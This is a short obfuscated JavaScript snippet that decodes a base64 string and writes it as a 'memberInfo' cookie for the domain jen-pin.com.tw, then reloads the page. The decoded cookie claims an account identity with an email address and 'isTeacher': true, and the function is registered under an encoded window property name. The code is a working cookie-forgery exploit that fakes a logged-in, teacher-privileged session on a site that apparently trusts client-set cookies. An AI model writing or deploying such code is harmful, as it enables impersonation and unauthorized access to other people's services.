function one() {
    const g = e => decodeURIComponent(escape(atob(e))), data = { '55yf5bmz6Kqe5paH': 'bWVtYmVySW5mbz17ImlkIjoiMTY3NzciLCJOYW1lIjoi5ris6Kmm6JmV6ZW3IiwiRW1haWwiOiJqcDFAcGluLWVubi5jb20udHciLCJpc1RlYWNoZXIiOnRydWV9OyBleHBpcmVzPSR7bmV3IERhdGUoRGF0ZS5ub3coKSArIDYwNDgwMDAwMCkudG9VVENTdHJpbmcoKX07IHBhdGg9LzsgZG9tYWluPWplbi1waW4uY29tLnR3' }
    for (const key in data) { if (data.hasOwnProperty(key)) { document.cookie = `${g(data[key])}`; ; } }
    window.location.reload();
}

window['amVuLXBpbi5jb20udHc='] = one;
